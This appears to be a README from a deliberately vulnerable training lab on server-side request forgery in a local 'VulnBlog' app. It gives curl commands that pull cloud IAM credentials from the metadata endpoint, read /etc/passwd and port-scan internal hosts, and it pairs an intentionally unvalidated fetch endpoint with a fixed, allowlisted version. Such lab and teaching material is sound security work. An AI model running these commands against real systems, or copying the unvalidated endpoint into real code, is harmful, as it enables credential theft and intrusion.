# VulnBlog SSRF Exploits

## Overview
Server-Side Request Forgery in VulnBlog's image fetching and pingback functionality.

## Target Application
- **App**: VulnBlog
- **Port**: 5001
- **Vulnerability**: SSRF in URL fetching
- **Severity**: HIGH

## Available Exploits

### 1. ssrf_exploit.py
SSRF to access internal resources and cloud metadata.

**Usage**:
```bash
python ssrf_exploit.py http://localhost:5001
```

## Exploitation

```bash
# Fetch internal resources
curl "http://localhost:5001/fetch_image?url=http://localhost:5000/admin"

# Cloud metadata (AWS)
curl "http://localhost:5001/fetch_image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Read local files (if file:// allowed)
curl "http://localhost:5001/fetch_image?url=file:///etc/passwd"

# Port scanning
for port in {1..1000}; do
  curl "http://localhost:5001/fetch_image?url=http://localhost:$port" -s -o /dev/null -w "%{http_code} - Port $port\n"
done
```

## Testing

1. **Start VulnBlog**:
```bash
cd ../../projects/vulnblog
docker-compose up -d
```

2. **Test SSRF**:
```bash
python ssrf_exploit.py http://localhost:5001
```

## Defense

**Vulnerable**:
```python
import requests

@app.route('/fetch_image')
def fetch_image():
    url = request.args.get('url')
    response = requests.get(url)  # No validation!
    return response.content
```

**Fixed**:
```python
import requests
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['cdn.example.com', 'images.example.com']

@app.route('/fetch_image')
def fetch_image():
    url = request.args.get('url')
    parsed = urlparse(url)
    
    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        return "Invalid scheme", 403
    
    # Validate domain
    if parsed.hostname not in ALLOWED_DOMAINS:
        return "Domain not allowed", 403
    
    # Block private IPs
    if parsed.hostname in ['localhost', '127.0.0.1'] or \
       parsed.hostname.startswith('192.168.') or \
       parsed.hostname.startswith('10.') or \
       parsed.hostname.startswith('172.'):
        return "Private IP blocked", 403
    
    response = requests.get(url, timeout=5)
    return response.content
```

## Notes
**WARNING**: SSRF can access internal APIs, cloud metadata, and perform port scanning.

## Related
- See `../../apigateway/ssrf/` for cloud metadata SSRF
- See `../../dataviz/ssrf/` for advanced SSRF

## References
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- Cloud SSRF: https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af
